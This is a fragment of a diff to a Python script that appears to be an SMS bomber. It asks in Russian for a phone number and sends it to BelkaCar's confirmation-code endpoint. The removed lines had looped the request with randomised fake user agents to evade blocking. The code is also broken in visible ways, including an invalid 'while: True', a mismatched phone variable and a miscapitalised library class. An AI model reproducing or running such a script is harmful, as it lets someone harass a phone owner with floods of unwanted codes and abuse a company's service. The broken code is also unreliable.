@@ -5,10 +5,6 @@ headers = {'user_agent' : user}
 
 NUMBER = input ('Введите номер телефона: ( Без +7 )')
 
-while: True
-    user = fake_useragent.Useragent().random
-    headers = {'user_agent' : user}
-
     try:
         requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={})
         print('[+] BelkaCar отправлено!')
